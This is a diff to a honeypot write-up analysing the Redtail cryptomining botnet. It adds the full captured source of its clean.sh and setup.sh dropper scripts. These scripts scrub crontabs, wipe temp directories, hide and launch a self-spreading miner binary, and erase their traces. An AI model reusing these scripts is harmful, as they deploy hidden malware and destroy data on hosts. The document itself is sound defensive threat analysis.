@@ -14,7 +14,7 @@ This writeup documents a campaign I captured with the Cowrie SSH honeypot on 202
 
 This campaign is distinct from the Mirai `mdrfckr` key injection campaign documented in NINGI-WRITEUP-004. While both inject SSH backdoor keys, the delivery method, tooling, key material, and persistence technique differ meaningfully. The binary name `redtail` is a self-identifier consistent with the "Redtail" cryptomining botnet documented externally since mid-2024.
 
-All artefacts in this writeup were captured by Cowrie on fuji. The `clean.sh` and `setup.sh` scripts are present on disk but owned by the `cowrie` user and unreadable without privilege escalation — their behaviour is reconstructed from the command sequence and binary filenames. The authorized_keys payload was captured in full.
+All artefacts in this writeup were captured by Cowrie on fuji, including the full source of both staging scripts. The `clean.sh` script confirms the campaign mines **Monero (XMR) via c3pool** and cleans competing malware from crontabs before deploying. The `setup.sh` script performs architecture detection, finds a writable executable directory, renames the binary to a hidden random filename, and launches with an `ssh` spreading argument. Both scripts erase themselves after execution.
 
 ---
 
@@ -127,10 +127,10 @@ echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 ```
 
 **Step 1 — Run and erase `clean.sh`:**  
-`clean.sh` (795 B) runs first. At this size it's a targeted cleanup script — likely kills competing miners, removes known malware artifacts, or clears shell history. It is deleted immediately after execution, leaving no trace.
+`clean.sh` (795 B) runs first. See full analysis below. Deleted immediately after execution.
 
 **Step 2 — Run and erase `setup.sh`:**  
-`setup.sh` (1,951 B) is the deployment script — installs and launches the `redtail.*` binary appropriate for the target architecture, likely sets up cron persistence, and configures the miner. Also deleted after execution.
+`setup.sh` (1,951 B) handles architecture detection and binary deployment. See full analysis below. Deleted immediately after execution.
 
 **Step 3 — Create `.ssh` directory:**  
 `mkdir -p ~/.ssh` ensures the SSH config directory exists, with `-p` suppressing errors if it already exists.
@@ -159,6 +159,169 @@ echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 Decoded: `auth_ok\n`. This is a confirmation signal sent back over the session channel — the C2 infrastructure (or a log-scraping process on the delivery node) reads this output to confirm the persistence step completed successfully. The beacon only fires after `chattr +ai` has run, so it specifically confirms persistence, not just login.
 
 This is the clearest C2 signalling behaviour I have captured in Cowrie to date. The `mdrfckr` campaign has no equivalent.
+
+---
+
+## Captured Artifact — clean.sh
+
+**SHA-256:** `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e`  
+**Size:** 795 bytes  
+**Captured:** `cowrie.session.file_upload` via SFTP
+
+```bash
+#!/bin/bash
+
+clean_crontab() {
+  chattr -ia "$1"
+  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_crontab
+  mv /tmp/clean_crontab "$1"
+}
+
+systemctl disable c3pool_miner
+systemctl stop c3pool_miner
+
+chattr -ia /var/spool/cron/crontabs
+for user_cron in /var/spool/cron/crontabs/*; do
+  [ -f "$user_cron" ] && clean_crontab "$user_cron"
+done
+
+for system_cron in /etc/crontab /etc/crontabs; do
+  [ -f "$system_cron" ] && clean_crontab "$system_cron"
+done
+
+for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
+  chattr -ia "$dir"
+  for system_cron in "$dir"/*; do
+    [ -f "$system_cron" ] && clean_crontab "$system_cron"
+  done
+done
+
+clean_crontab /etc/anacrontab
+
+for i in /tmp /var/tmp /dev/shm; do
+  rm -rf $i/*
+done
+```
+
+**`systemctl disable c3pool_miner` / `systemctl stop c3pool_miner`** — This is the most significant line in the script. `c3pool` is a well-known Monero (XMR) mining pool. The presence of a systemd service named `c3pool_miner` is a Redtail campaign artefact — previous Redtail infections register the miner as a service for persistence. This `clean.sh` therefore kills and disables a **prior Redtail installation** on the same host before deploying fresh. The campaign reinstalls itself cleanly rather than stacking on top of a stale deployment.
+
+**`clean_crontab()` — Competitor eviction via crontab scrubbing:**  
+The function strips crontab entries containing: `wget`, `curl`, `/dev/tcp`, `/tmp`, `.sh`, `nc`, `bash -i`, `sh -i`, `base64 -d`. This covers essentially every common malware persistence pattern used in crontabs — wget/curl downloaders, TCP reverse shells, temp-directory scripts, netcat shells, and base64-encoded payloads. The script uses `chattr -ia` on each crontab file before modifying it, anticipating hardened targets.
+
+The scope is exhaustive: user crontabs (`/var/spool/cron/crontabs/*`), system crontab (`/etc/crontab`, `/etc/crontabs`), all cron drop directories (`/etc/cron.{hourly,daily,weekly,monthly,d}`), and `anacrontab`. Any competing malware maintaining cron persistence is evicted before Redtail deploys.
+
+**`/tmp`, `/var/tmp`, `/dev/shm` wipe:**  
+`rm -rf $i/*` clears all three common staging directories. This removes competing malware payloads that were staged there, and clears evidence of the attacker's own prior activity on previously compromised hosts.
+
+The ordering matters: the systemd service is killed *before* crontabs are cleaned. If a previous `c3pool_miner` service had a cron watchdog entry, killing the service first prevents it from respawning during the crontab cleanup pass.
+
+---
+
+## Captured Artifact — setup.sh
+
+**SHA-256:** `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59`  
+**Size:** 1,951 bytes  
+**Captured:** `cowrie.session.file_upload` via SFTP
+
+```bash
+#!/bin/bash
+
+get_random_string() {
+  len=$(expr $(od -An -N2 -i /dev/urandom 2>/dev/null | tr -d ' ') % 32 + 4 2>/dev/null)
+
+  if command -v openssl >/dev/null 2>&1; then
+    str=$(openssl rand -base64 256 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c "$len")
+    if [ -n "$str" ]; then echo "$str"; return 0; fi
+  fi
+
+  if [ -r /dev/urandom ]; then
+    str=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c "$len")
+    if [ -n "$str" ]; then echo "$str"; return 0; fi
+  fi
+
+  if [ -n "$RANDOM" ]; then echo "$RANDOM"; return 0; fi
+
+  echo "redtail"   # hardcoded fallback — campaign name embedded in script
+  return 1
+}
+
+NOARCH=false
+ARCH=$(uname -mp)
+
+if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
+  ARCH="x86_64"
+elif echo "$ARCH" | grep -q "i[3456]86"; then
+  ARCH="i686"
+elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
+  ARCH="arm8"
+elif echo "$ARCH" | grep -q "armv7"; then
+  ARCH="arm7"
+else
+  NOARCH=true
+fi
+
+NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
+EXCLUDE=""
+for dir in $NOEXEC_DIRS; do
+  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
+done
+
+FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx \
+  -not -path "/tmp/*" -not -path "/proc/*" $EXCLUDE 2>/dev/null)
+CURR=${PWD}
+FILENAME=".$(get_random_string)"
+
+for i in $FOLDERS /tmp /var/tmp /dev/shm; do
+  if cd "$i" && touch .testfile && \
+     (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || \
+      truncate -s 2M .testfile2 >/dev/null 2>&1); then
+    rm -rf .testfile .testfile2
+    if [ "$CURR" != "$i" ]; then cp -r "$CURR"/redtail.* "$i"; fi
+    break
+  fi
+done
+
+rm -rf .redtail
+rm -rf $FILENAME
+
+if [ $NOARCH = true ]; then
+  for a in x86_64 i686 arm8 arm7; do
+    cat redtail.$a >$FILENAME
+    chmod +x $FILENAME
+    ./$FILENAME ssh
+  done
+else
+  cat redtail.$ARCH >$FILENAME
+  chmod +x $FILENAME
+  ./$FILENAME ssh
+fi
+
+rm -rf redtail.*
+rm -rf "$CURR"/redtail.*
+```
+
+**`get_random_string()` — Hidden filename generation:**  
+Generates a random alphanumeric string using `openssl rand`, `/dev/urandom`, or shell `$RANDOM` as fallbacks. The length is randomised (4–35 chars). The resulting string is prefixed with `.` to create a hidden file: `.$(get_random_string)`. If all entropy sources fail, the fallback is the literal string `"redtail"` — the campaign name is hardcoded into the script. This means on a sufficiently locked-down system the binary would be named `.redtail`, which is itself a detection IoC.
+
+**Architecture detection via `uname -mp`:**  
+Maps the machine hardware and processor fields to one of four targets: `x86_64`, `i686`, `arm8` (armv8/aarch64), `arm7`. Sets `NOARCH=true` if no match — triggering the shotgun fallback path.
+
+**Writable executable directory search:**  
+Finds directories owned by the current user with rwx permissions, explicitly excluding `/tmp` and `/proc`, and filtering out `noexec` mount points (read from `/proc/mounts`). This is more careful than most malware — it avoids writing to directories where execution is blocked at the filesystem level, which would cause silent failures. `/tmp` is excluded from the search but added as a last-resort fallback.
+
+The directory is tested for actual writability and sufficient space (attempts to write a 2 MB test file) before being selected. The 2 MB threshold is likely calibrated against the smallest `redtail.*` binary (arm7 at 1.2 MB).
+
+**Binary deployment and hidden rename:**  
+The correct-arch binary is copied via `cat redtail.$ARCH > $FILENAME` rather than `cp` or `mv`. This writes file content without preserving the original filename in any metadata. The resulting hidden file (`.Xk9mQr2...`) has no obvious connection to `redtail`.
+
+**`$FILENAME ssh` — SSH spreading mode:**  
+Every binary is invoked with `ssh` as the sole argument. Identical to the `tux.* ssh` pattern in the Mirai campaign (NINGI-WRITEUP-004), this argument instructs the binary to run in SSH propagation mode — scanning for and attacking other SSH-accessible hosts. The miner binary itself is the spreader.
+
+**`NOARCH` fallback — shotgun deployment:**  
+On unrecognised architectures, the script tries all four binaries sequentially. The OS rejects incompatible ELF formats with `Exec format error`; only the matching architecture executes. This mirrors the Mirai multi-arch dropper approach from NINGI-WRITEUP-004.
+
+**Anti-forensics cleanup:**  
+`rm -rf redtail.*` and `rm -rf "$CURR"/redtail.*` remove the binaries from both the deployment directory and the original working directory. Combined with the earlier deletion of `clean.sh` and `setup.sh` from the main command, there are no named artefacts left on disk — only the hidden random-named running process.
 
 ---
 
@@ -295,8 +458,9 @@ These are distinct operations. Redtail is more operationally sophisticated: push
 | Account Manipulation: SSH Authorized Keys | T1098.004 | `rsa-key-20230629` key injection |
 | File and Directory Permissions Modification | T1222.002 | `chattr -ia` then `chattr +ai` |
 | System Information Discovery | T1082 | `uname -a` |
-| Resource Hijacking | T1496 | Redtail binaries consistent with cryptominer |
-| Non-Standard Port | — | Not observed (standard SSH 22) |
+| Resource Hijacking | T1496 | Monero mining via c3pool confirmed by `clean.sh` |
+| Service Stop | T1489 | `systemctl stop c3pool_miner` — kills prior installation |
+| Masquerading: Match Legitimate Name or Location | T1036.005 | Binary renamed to hidden dot-file with random name |
 | Application Layer Protocol | T1071 | `auth_ok` beacon over SSH channel |
 
 ---
@@ -313,10 +477,14 @@ These are distinct operations. Redtail is more operationally sophisticated: push
 
 **Two-node infrastructure separates scanning risk from delivery risk.** The probe IP (`172.245.16.13`) is the one that appears in repeated scan logs and is likely to get blocked first. The delivery IP (`130.12.180.51`) only appears once the credential is confirmed, reducing its exposure to blocklists. Defenders should correlate probe-then-deliver patterns across sessions, not just flag individual IPs.
 
-**`clean.sh` runs before `setup.sh`.** Even though neither script is readable, the ordering matters: cleanup precedes deployment. Any forensic investigation on a compromised host should look for signs of killed processes or removed files from competing malware in the minutes before the `redtail.*` binary appears.
+**`clean.sh` kills its own previous installation first.** The `systemctl stop c3pool_miner` call targets a service that Redtail itself creates — meaning the campaign reinstalls cleanly over stale deployments rather than stacking. On a real compromised host, `systemctl status c3pool_miner` before and after an attack would show the service being stopped and then re-registered under a random hidden name.
+
+**`setup.sh` avoids `noexec` mounts.** The script reads `/proc/mounts` and explicitly excludes directories mounted with the `noexec` flag. Most malware just writes to `/tmp` and fails silently on hardened systems. Redtail tests for writability and executability before committing — a reliability improvement that increases successful deployments on locked-down targets.
+
+**The `.redtail` fallback is an IoC.** If `openssl` and `/dev/urandom` are both unavailable, the hidden binary is literally named `.redtail`. Checking for this file across user home directories and common writable paths is a fast triage step: `find / -name ".redtail" 2>/dev/null`.
 
 ---
 
 *All artefacts documented here were captured by Cowrie on fuji between 2026-04-02 and 2026-05-04.*  
-*`clean.sh` and `setup.sh` contents are unreadable without cowrie user privilege — content is inferred from context.*  
+*`clean.sh`, `setup.sh`, and the authorized_keys payload were read directly from the Cowrie downloads directory.*  
 *This writeup is part of the ningi homelab security research project.*
